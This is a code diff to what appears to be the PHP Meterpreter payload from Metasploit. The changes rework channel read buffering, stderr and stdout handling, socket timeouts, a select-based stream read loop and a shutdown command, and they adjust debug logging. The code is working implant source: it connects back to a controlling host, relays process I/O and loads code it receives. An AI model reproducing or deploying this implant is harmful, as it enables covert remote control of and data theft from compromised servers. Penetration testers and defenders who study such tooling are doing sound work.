@@ -218,7 +218,7 @@ function core_channel_eof($req, &$pkt) {
 
 # Works
 function core_channel_read($req, &$pkt) {
-    #my_print("doing channel read");
+    my_print("doing channel read");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
     $id = $chan_tlv['value'];
@@ -252,6 +252,9 @@ function core_channel_write($req, &$pkt) {
     }
 }
 
+#
+# This is called when the client wants to close a channel explicitly.  Not to be confused with 
+#
 function core_channel_close($req, &$pkt) {
     global $channel_process_map;
     # XXX remove the closed channel from $readers
@@ -263,6 +266,10 @@ function core_channel_close($req, &$pkt) {
     if ($c) {
         # We found a channel, close its stdin/stdout/stderr
         channel_close_handles($id);
+
+        # This is an explicit close from the client, always remove it from the
+        # list, even if it has data.
+        channel_remove($id);
 
         # if the channel we're closing is associated with a process, kill the
         # process
@@ -292,15 +299,21 @@ function channel_close_handles($cid) {
     for($i = 0; $i < 3; $i++) {
         #my_print("closing channel fd $i, {$c[$i]}");
         if (array_key_exists($i, $c) && is_resource($c[$i])) {
-            my_print("Closing handle {$c[$i]}");
             close($c[$i]);
             # Make sure the main loop doesn't select on this resource after we
             # close it.
             remove_reader($c[$i]);
         }
     }
-    # After closing all the channel's handlers, the channel itself isn't very
-    # useful, axe it from the list.
+
+    # axe it from the list only if it doesn't have any leftover data
+    if (strlen($c['data']) == 0) {
+        channel_remove($cid);
+    }
+}
+
+function channel_remove($cid) {
+    global $channels;
     unset($channels[$cid]);
 }
 
@@ -357,11 +370,26 @@ function core_channel_interact($req, &$pkt) {
     return $ret;
 }
 
+function interacting($cid) {
+    global $readers;
+    $c = get_channel_by_id($cid);
+    if (in_array($c[1], $readers)) {
+        return true;
+    }
+    return false;
+}
+
+
+function core_shutdown($req, &$pkt) {
+    my_print("doing core shutdown");
+    die();
+}
+
 # zlib support is not compiled in by default, so this makes sure the library
 # isn't compressed before eval'ing it
 # TODO: check for zlib support and decompress if possible
 function core_loadlib($req, &$pkt) {
-    my_print("doing core_loadlib (no-op)");
+    my_print("doing core_loadlib");
     $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
     if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
         return ERROR_FAILURE;
@@ -385,7 +413,7 @@ function register_channel($in, $out=null, $err=null) {
     global $channels;
     if ($out == null) { $out = $in; }
     if ($err == null) { $err = $out; }
-    $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in));
+    $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '');
 
     # Grab the last index and use it as the new ID.
     $id = end(array_keys($channels));
@@ -404,6 +432,7 @@ function register_channel($in, $out=null, $err=null) {
 #            [1] => Resource id #13
 #            [2] => Resource id #14
 #            [type] => 'stream'
+#            [data] => '...'
 #       )
 # )
 #
@@ -424,27 +453,77 @@ function get_channel_id_from_resource($resource) {
 function get_channel_by_id($chan_id) {
     global $channels;
     my_print("Looking up channel id $chan_id");
-    dump_channels("in get_channel_by_id");
+    #dump_channels("in get_channel_by_id");
     if (array_key_exists($chan_id, $channels)) {
+        my_print("Found one");
         return $channels[$chan_id];
     } else {
         return false;
     }
 }
+
 # Write data to the channel's stdin
 function channel_write($chan_id, $data) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[0])) {
+        my_print("---Writing '$data' to channel $chan_id");
         return write($c[0], $data);
     } else {
         return false;
     }
 }
+
 # Read from the channel's stdout
 function channel_read($chan_id, $len) {
     $c = get_channel_by_id($chan_id);
-    if ($c && is_resource($c[1])) {
-        return read($c[1], $len);
+    if ($c) {
+        # First get any pending unread data from a previous read
+        $ret = substr($c['data'], 0, $len);
+        $c['data'] = substr($c['data'], $len);
+        if (strlen($ret) > 0) { my_print("Had some leftovers: '$ret'"); }
+
+        # Next grab stderr if we have it and it's not the same file descriptor
+        # as stdout.
+        if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) {
+            # Read as much as possible into the channel's data buffer
+            $read = read($c[2]);
+            $c['data'] .= $read;
+
+            # Now slice out however much the client asked for.  If there's any
+            # left over, they'll get it next time.  If it doesn't add up to
+            # what they requested, oh well, they'll just have to call read
+            # again. Looping until we get the requested number of bytes is
+            # inconsistent with win32 meterpreter and causes the whole php
+            # process to block waiting on input.
+            $bytes_needed = $len - strlen($ret);
+            $ret .= substr($c['data'], 0, $bytes_needed);
+            $c['data'] = substr($c['data'], $bytes_needed);
+        }
+
+        # Then if there's still room, grab stdout
+        if (strlen($ret) < $len and is_resource($c[1])) {
+            # Same as above, but for stdout.  This will overwrite a false
+            # return value from reading stderr but the two should generally
+            # EOF at the same time, so it should be fine.
+            $read = read($c[1]);
+            $c['data'] .= $read;
+            $bytes_needed = $len - strlen($ret);
+            $ret .= substr($c['data'], 0, $bytes_needed);
+            $c['data'] = substr($c['data'], $bytes_needed);
+        }
+
+        # In the event of one or the other of the above read()s returning
+        # false, make sure we have sent any pending unread data before saying
+        # EOF by returning false.  Note that if they didn't return false, it is
+        # perfectly legitimate to return an empty string which just means
+        # there's no data right now but we haven't hit EOF yet.
+        if (false === $read and empty($ret)) {
+            if (interacting($chan_id)) {
+                handle_dead_resource_channel($c[1]);
+            }
+            return false;
+        }
+        return $ret;
     } else {
         return false;
     }
@@ -485,9 +564,11 @@ function handle_dead_resource_channel($resource) {
         close($resource);
     } else {
         my_print("Handling dead resource: {$resource}, for channel: {$cid}");
+
         # Make sure we close other handles associated with this channel as well
         channel_close_handles($cid);
 
+        # Notify the client that this channel is dead
         $pkt = pack("N", PACKET_TYPE_REQUEST);
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
@@ -503,7 +584,7 @@ function handle_dead_resource_channel($resource) {
 function handle_resource_read_channel($resource, $data) {
     global $udp_host_map;
     $cid = get_channel_id_from_resource($resource);
-    my_print("Handling data from $resource: {$data}");
+    my_print("Handling data from $resource");
 
     # Build a new Packet
     $pkt = pack("N", PACKET_TYPE_REQUEST);
@@ -527,7 +608,7 @@ function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
 
     $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
-    #my_print("method is {$method_tlv['value']}");
+    my_print("method is {$method_tlv['value']}");
     packet_add_tlv($pkt, $method_tlv);
 
     $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
@@ -669,6 +750,9 @@ function connect($ipaddr, $port, $proto='tcp') {
         if ($proto == 'tcp') {
             $sock = fsockopen($ipaddr,$port);
             if (!$sock) { return false; }
+            if (is_callable('socket_set_timeout')) {
+                socket_set_timeout($sock, 2);
+            }
             register_stream($sock);
         } else {
             $sock = fsockopen($proto."://".$ipaddr,$port);
@@ -696,14 +780,31 @@ function eof($resource) {
     switch (get_rtype($resource)) {
     # XXX Doesn't work with sockets.
     case 'socket': break;
-    case 'stream': $ret = feof($resource); break;
+    case 'stream':
+        # We set the socket timeout for streams opened with fsockopen() when
+        # they are created. I hope this is enough to deal with hangs when
+        # calling feof() on socket streams, but who knows. This is PHP,
+        # anything could happen. Some day they'll probably add a new function
+        # called stream_eof() and it will handle sockets properly except for
+        # some edge case that happens for every socket except the one or two
+        # they tested it on and it will always return false on windows and
+        # later they'll rename it to real_stream_eof_this_language_isretarded().
+        #
+        # See http://us2.php.net/manual/en/function.feof.php , specifically this:
+        #   If a connection opened by fsockopen() wasn't closed by the server,
+        #   feof() will hang. To workaround this, see below example: 
+        #     <?php
+        #     function safe_feof($fp, &$start = NULL) {
+        #     ...
+        $ret = feof($resource);
+        break;
     }
     return $ret;
 }
 
 function close($resource) {
     my_print("Closing resource $resource");
-    global $readers, $resource_type_map, $udp_host_map;
+    global $resource_type_map, $udp_host_map;
 
     remove_reader($resource);
     switch (get_rtype($resource)) {
@@ -738,18 +839,76 @@ function read($resource, $len=null) {
             socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port);
         } else {
             my_print("Reading TCP socket");
-            $buff = socket_read($resource, $len, PHP_BINARY_READ);
+            $buff .= socket_read($resource, $len, PHP_BINARY_READ);
         }
         break;
     case 'stream':
-        #my_print("Reading stream");
-        $md = stream_get_meta_data($resource);
-        #dump_array($md, "Meta data for $resource");
-        $buff = fread($resource, $len);
+        global $msgsock;
+        # Calling select here should ensure that we never try to read from a socket
+        # or pipe that doesn't currently have data.  If that ever happens, the
+        # whole php process will block waiting for data that may never come.
+        # Unfortunately, selecting on pipes created with proc_open on Windows
+        # always returns immediately.  Basically, shell interaction in Windows
+        # is hosed until this gets figured out.  See https://dev.metasploit.com/redmine/issues/2232
+        $r = Array($resource);
+        my_print("Calling select to see if there's data on $resource");
+        while (true) {
+            $cnt = stream_select($r, $w=NULL, $e=NULL, 0);
+
+            # Stream is not ready to read, have to live with what we've gotten
+            # so far
+            if ($cnt === 0) {
+                break;
+            }
+
+            # if stream_select returned false, something is wrong with the
+            # socket or the syscall was interrupted or something.
+            if ($cnt === false or feof($resource)) {
+                my_print("Checking for failed read...");
+                if (empty($buff)) {
+                    my_print("----  EOF ON $resource  ----");
+                    $buff = false;
+                }
+                break;
+            }
+
+            $md = stream_get_meta_data($resource);
+            dump_array($md);
+            if ($md['unread_bytes'] > 0) {
+                $buff .= fread($resource, $md['unread_bytes']);
+                break;
+            } else {
+                #$len = 1;
+                $tmp = fread($resource, $len);
+                $buff .= $tmp;
+                if (strlen($tmp) < $len) {
+                    break;
+                }
+            }
+            
+            if ($resource != $msgsock) { my_print("buff: '$buff'"); }
+            $r = Array($resource);
+        }
+        my_print(sprintf("Done with the big read loop on $resource, got %d bytes", strlen($buff)));
         break;
-    default: my_print("Wtf don't know how to read from resource $resource"); break;
+    default: 
+        # then this is possibly a closed channel resource, see if we have any
+        # data from previous reads
+        $cid = get_channel_id_from_resource($resource);
+        $c = get_channel_by_id($cid);
+        if ($c and $c['data']) {
+            $buff = substr($c['data'], 0, $len);
+            $c['data'] = substr($c['data'], $len);
+            my_print("Aha!  got some leftovers");
+        } else {
+            my_print("Wtf don't know how to read from resource $resource, c: $c");
+            if (is_array($c)) {
+                dump_array($c);
+            }
+            break;
+        }
     }
-    #my_print(sprintf("Read %d bytes", strlen($buff)));
+    my_print(sprintf("Read %d bytes", strlen($buff)));
     return $buff;
 }
 
@@ -768,10 +927,12 @@ function write($resource, $buff, $len=0) {
             $count = socket_write($resource, $buff, $len);
         }
         break;
-    case 'stream': $count = fwrite($resource, $buff, $len); break;
+    case 'stream': 
+        $count = fwrite($resource, $buff, $len);
+        fflush($resource);
+        break;
     default: my_print("Wtf don't know how to write to resource $resource"); break;
     }
-    #my_print("Wrote $count bytes");
     return $count;
 }
 
@@ -961,12 +1122,14 @@ while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
         } else {
             #my_print("not Msgsock: $ready");
             $data = read($ready);
-            if (false === $data || strlen($data) == 0) {
+            if (false === $data) {
                 handle_dead_resource_channel($ready);
-            } else {
+            } elseif (strlen($data) > 0){
                 my_print(sprintf("Read returned %s bytes", strlen($data)));
                 $request = handle_resource_read_channel($ready, $data);
-                write($msgsock, $request);
+                if ($request) {
+                    write($msgsock, $request);
+                }
             } 
         }
     }
